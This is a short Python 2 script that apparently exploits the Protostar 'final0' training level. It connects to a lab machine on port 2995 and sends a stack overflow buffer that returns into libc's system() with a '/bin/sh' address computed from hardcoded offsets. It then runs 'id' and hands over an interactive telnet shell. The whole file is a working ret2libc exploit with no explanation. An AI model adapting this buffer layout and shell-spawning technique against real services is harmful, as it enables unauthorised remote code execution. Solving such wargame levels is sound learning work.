import socket
import struct
import telnetlib


######################################################################
#                    protostar final0                                #
#                                                                    #
#               LIBC 0xb7e97000                                      #
#               /bin/sh offset 1176511                               #
#               system offset 233392                                 #
######################################################################

ip='192.168.207.130'
port=2995
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

so.connect((ip,port))
EXE=struct.pack("I",0x08048c0c)

BIN=struct.pack("I",1176511+0xb7e97000)
buf="a"*510
buf+="\x00"
buf+="a"*4+"b"*4+"c"*4+"d"*4+"e"*5
system=struct.pack("I",233392+0xb7e97000)


############ options use  system or execve #########

buf+=system+"AAAA"+BIN
#buf+=EXE+"FUCK"+BIN+"\x00"*8
####################################################
so.send(buf+"\n")
so.send("id\n")
print so.recv(1024)

t=telnetlib.Telnet()
t.sock=so
t.interact()
